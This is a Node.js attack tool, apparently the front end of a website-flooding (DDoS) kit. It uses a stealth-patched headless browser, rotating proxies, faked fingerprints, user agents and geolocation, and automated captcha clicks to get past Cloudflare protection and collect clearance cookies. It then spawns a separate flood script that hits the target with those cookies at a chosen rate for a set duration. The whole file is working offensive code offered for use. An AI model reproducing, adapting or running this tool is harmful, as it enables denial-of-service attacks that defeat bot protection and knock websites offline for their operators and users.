const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();

puppeteer.use(stealthPlugin);
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m",
  COLOR_PURPLE: "\x1b[35m",
  COLOR_CYAN: "\x1b[36m",
  COLOR_BLUE: "\x1b[34m",
  COLOR_BRIGHT_RED: "\x1b[91m",
  COLOR_BRIGHT_GREEN: "\x1b[92m",
  COLOR_BRIGHT_YELLOW: "\x1b[93m",
  COLOR_BRIGHT_BLUE: "\x1b[94m",
  COLOR_BRIGHT_PURPLE: "\x1b[95m",
  COLOR_BRIGHT_CYAN: "\x1b[96m",
  COLOR_BRIGHT_WHITE: "\x1b[97m",
  BOLD: "\x1b[1m",
};

const { spawn } = require("child_process");
const colored = (colorCode, text, isBold = false) => {
  const boldStart = isBold ? colors.BOLD : '';
  return boldStart + colorCode + text + colors.COLOR_RESET;
};
if (process.argv.length < 8) {
  console.clear();
  console.log(`
    ${colored(colors.COLOR_BRIGHT_PURPLE, 'BROWSER v1.2')} | Latest update For Cloudflare Captcha Bypass , Speed Captcha Solving With More Options Added Can Help The Solution Become More Optimized
    
    ${colored(colors.COLOR_BRIGHT_BLUE, 'Usage:')}
        ${colored(colors.COLOR_BRIGHT_RED, 'node browser.js [targetURL] [threads] [proxyFile] [rates] [duration] true/false')}
        node browser.js https://example.com 8 proxy.txt 64 200 true --fin true --load true --headers true --blocked Indonesia

    ${colored(colors.COLOR_BRIGHT_BLUE, 'Options:')}
        --fin         ${colored(colors.COLOR_BRIGHT_GREEN, 'true')}                            ${colored(colors.COLOR_BRIGHT_YELLOW, '-Enable browser fingerprint')}
        --load        ${colored(colors.COLOR_BRIGHT_GREEN, 'true')}                            ${colored(colors.COLOR_BRIGHT_YELLOW, '-Optimize memory and CPU usage')}
        --headers     ${colored(colors.COLOR_BRIGHT_GREEN, 'true')}                            ${colored(colors.COLOR_BRIGHT_YELLOW, '-SET EXTRA HEADERS')}
        --blocked     ${colored(colors.COLOR_BRIGHT_GREEN, 'Indonesia/USA/China/Brazil')}      ${colored(colors.COLOR_BRIGHT_YELLOW, '-Allows emulating location addresses for geoblocks')}
        --static      ${colored(colors.COLOR_BRIGHT_GREEN, 'true')}                            ${colored(colors.COLOR_BRIGHT_YELLOW, 'COMING SOON .....')}
  `);
  process.exit(1);
}
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const flood = process.argv[7];
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const nodeii = getRandomInt(124, 126);
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
function getCurrentTime() {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
}
const options = [

  { flag: '--load', value: get_option('--load') },
  { flag: '--fin', value: get_option('--fin') },
  { flag: '--headers', value: get_option('--headers') },
  { flag: '--static', value: get_option('--static') }

];
const blockedCountry = get_option('--blocked');
function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}
function check_proxy(proxy) {
  return new Promise((resolve, reject) => {
    request({
      url: "https://google.com",
      proxy: "http://" + proxy,
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      },
      timeout: 5000 // Set a timeout of 5 seconds
    }, (err, res, body) => {
      if (!err && res.statusCode === 200) {
        resolve(proxy);
      } else {
        reject(err);
      }
    });
  });
}

async function isProxyValid(browserProxy) {
  try {
    await check_proxy(browserProxy);
    return browserProxy;
  } catch (error) {
    throw new Error();
  }
}


async function handleCFChallenge(page) {
  await sleep(15);
  const captchaContainer = await page.$("div.spacer > div:first-child", { delay: 100 });
  if (captchaContainer) {
  try {
    const boundingBox = await captchaContainer.boundingBox();
    if (boundingBox) {
      const { x, y } = await captchaContainer.boundingBox();
      await page.mouse.click(x + 20, y + 20);
    } else {
      }
    } catch (error) {
    }
  } else {
  }

  await sleep(10);
}

const locations = [
  { name: 'USA', latitude: 37.7749, longitude: -122.4194 },
  { name: 'China', latitude: 39.9042, longitude: 116.4074 },
  { name: 'Brazil', latitude: -23.5505, longitude: -46.6333 },
  { name: 'Indonesia', latitude: -6.2088, longitude: 106.8456 }
];

function getLocationByName(name) {
  return locations.find(location => location.name.toLowerCase() === name.toLowerCase());
}

async function setGeolocation(page, latitude, longitude) {
  console.log(`Setting geolocation to latitude: ${latitude}, longitude: ${longitude}`);
  await page.setGeolocation({ latitude, longitude });
  await sleep(2);
}

async function isBlocked(page) {
  const title = await page.title();
  console.log(`Page title: ${title}`);
  return title === "Attention Required! | Cloudflare";
}

async function applyGeolocation(page) {
  if (blockedCountry) {
    const location = getLocationByName(blockedCountry);
    if (location) {
      console.log(`Applying geolocation for ${location.name}`);
      await setGeolocation(page, location.latitude, location.longitude);
      await sleep(5); 
      const blocked = await isBlocked(page);
      if (blocked) {
        console.log(`Access blocked at location ${location.name}`);
        await switchProxy();
      } else {
        console.log(`Access granted with location ${location.name}`);
      }
    } else {
      console.log(`Country "${blockedCountry}" not found in the location list.`);
    }
  } else {
    console.log('No blocked country specified.');
  }
}

async function detectChallenge(browserProxy, page) {
  const title = await page.title();
  const content = await page.content();

  if (title === "Attention Required! | Cloudflare") {
    console.log("Detected Cloudflare blocking page.");
    if (blockedCountry) {
      console.log(`Trying geolocation for blocked country: ${blockedCountry}`);
      await applyGeolocation(page);
     
      await page.reload({ waitUntil: ['networkidle2'] });
      const newTitle = await page.title();
      if (newTitle === "Attention Required! | Cloudflare") {
        console.log(`Still blocked after applying geolocation.`);
        await switchProxy();
        throw new Error("Proxy blocked");
      }
    } else {
      throw new Error("Proxy blocked");
    }
  }

  if (content.includes("challenge-platform")) {
    console.log(colored(colors.COLOR_CYAN, "FOUND CF challenge " + browserProxy));
    await handleCFChallenge(page);
    return;
  }

  console.log(colored(colors.COLOR_PURPLE, "No challenge detected " + browserProxy));
  await sleep(10);
}



async function openBrowser(targetURL, browserProxy) {
const randomVersion = Math.floor(Math.random() * 7) + 120;
 const userAgents = [
   `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${randomVersion}.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15`,
   `Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`, 
`Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`, 
   `Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53`
 ];
 function getSecChUa() {
    const brands = [
        `"Google Chrome";v="126"`,
        `"Chromium";v="126"`,
        `"Not-A.Brand";v="126"`
    ];
    return brands.join(', ');
}

 const randomIndex = Math.floor(Math.random() * userAgents.length);
 const randomUA = userAgents[randomIndex];
 const promise = async (resolve, reject) => {
   const browser = await puppeteer.launch({
     headless: "new",
     ignoreHTTPSErrors: true,
     args: [
       "--proxy-server=http://" + browserProxy,
       '--no-sandbox',
       '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
       '--use-fake-device-for-media-stream',
       '--disable-setuid-sandbox',
       '--use-fake-ui-for-media-stream',
       '--enable-experimental-web-platform-features',
       '--disable-dev-shm-usage',
       '--disable-software-rasterizer',
       '--ignore-certificate-errors',
       "--no-first-run",
       '--disable-popup-blocking',
       '--disable-gpu',
       '--disable-extensions',
       '--test-type',
       '--color-scheme=' + randomElement(['dark', 'light']),
       '--disable-browser-side-navigation',
       "--user-agent="
       + randomUA
      ],
    ignoreDefaultArgs: ['--enable-automation']
});
   try {
     const message1 = colored(colors.COLOR_RESET, "Start Run In: " + browserProxy);
console.log(message1);

      const [page] = await browser.pages();
      const client = page._client();
     
if (enabled('headers')) {
      await page.setExtraHTTPHeaders({
      
      'Sec-Fetch-User': '?1',
      'Connection' : "Keep-Alive",
      'DNT' : "1",
      'sec-ch-ua': getSecChUa(),
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
      'Accept-Encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,en;q=0.8',
      
    });
    }; 

    
    if (enabled('load')) {
      const blockedResources = ['BlockCssAssets', 'BlockImages', 'BlockFonts', 'BlockIcons', 'BlockMedia'];
      await page.setRequestInterception(true);
      page.on('request', (req) => {
        if (blockedResources.includes(req.resourceType())) {
          req.abort();
        } else {
          req.continue();
        }
      });
    }
 
 if (enabled('fin')) {
    await page.evaluateOnNewDocument(() => {
        // Helper function to set properties
        const setProperty = (obj, prop, value) => {
            Object.defineProperty(obj, prop, {
                get: () => value,
                configurable: true,
                enumerable: true
            });
        };

        // Thi?t l?p c�c thu?c t�nh cho navigator
        const navigatorProperties = {
            languages: ['en-US', 'en'],
            hardwareConcurrency: 4,
            vendor: 'Google Inc.',
            webdriver: false,
            mimeTypes: [{ type: 'application/pdf', suffixes: 'pdf' }],
            mediaDevices: { enumerateDevices: () => Promise.resolve([]) },
            permissions: { query: () => Promise.resolve({ state: 'granted' }) },
            connection: { effectiveType: '4g', saveData: false }
        };

        
        Object.keys(navigatorProperties).forEach(prop => {
            setProperty(navigator, prop, navigatorProperties[prop]);
        });

        
        const screenProperties = {
            width: 1920,
            height: 1080,
            availWidth: 1920,
            availHeight: 1080,
            colorDepth: 24,
            pixelDepth: 24,
            orientation: { type: 'landscape-primary', angle: 0 }
        };

        
        Object.keys(screenProperties).forEach(prop => {
            setProperty(screen, prop, screenProperties[prop]);
        });

        const localStorageMock = {
      store: {},
      getItem(key) {
        return this.store[key] || null;
      },
      setItem(key, value) {
        this.store[key] = value.toString();
      },
      removeItem(key) {
        delete this.store[key];
      },
      clear() {
        this.store = {};
      }
    };
    Object.defineProperty(window, 'localStorage', {
      value: localStorageMock,
      writable: false
    });
        const windowProperties = {
            innerWidth: 1920,
            innerHeight: 1080,
            outerWidth: 1920,
            outerHeight: 1080,
        };

        // �p d?ng c�c thu?c t�nh cho window
        Object.keys(windowProperties).forEach(prop => {
            setProperty(window, prop, windowProperties[prop]);
        });

        // Thi?t l?p th�m thu?c t�nh cho screen.orientation n?u c?n
        setProperty(screen, 'orientation', screenProperties.orientation);
    });
}






const userAgent = await page.evaluate(() => navigator.userAgent);
await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });

    page.on("framenavigated", (frame) => {
        if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
      });
     page.setDefaultNavigationTimeout(60 * 1000);
     
     

    

     await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
     await detectChallenge(browserProxy, page, reject);
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
     
     resolve({
      title: title,
      browserProxy: browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: userAgent,
      content: await page.content(),
      
    });

  } catch (exception) {
    
  } finally {
  await browser.close();
  }
}
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            const currentTime = getCurrentTime();
            if (response) {
            if (response.title === "Just a moment...") {
                    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
                    return;
                }
            if (!response.cookies.includes("cf_chl") || (response.cookies.includes("cf_chl") && response.cookies.length > 32)) {

                const details = `\nTIME : ${currentTime} || ${response.browserProxy} || User Agent: ${response.userAgent} || Cookie: ${response.cookies}`;
                console.log(details);

                if (flood === 'true') {
                for (let i = 0; i < 2; i++) {
                spawn("node", [
                    "floodbrs.js",
                    targetURL,
                    "120",
                    "12",
                    response.browserProxy,
                    rates,
                    response.cookies,
                    response.userAgent
                ]);
                }
                }
                }
                }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}


var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);
async function __main__() {
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    isProxyValid(browserProxy)
    .then(browserProxy => {
      queue.unshift({ browserProxy: browserProxy });
    })
    .catch(error => {
    });
  }
}
__main__();
setTimeout(function(){
   process.exit();
}, process.argv[6] * 1000);


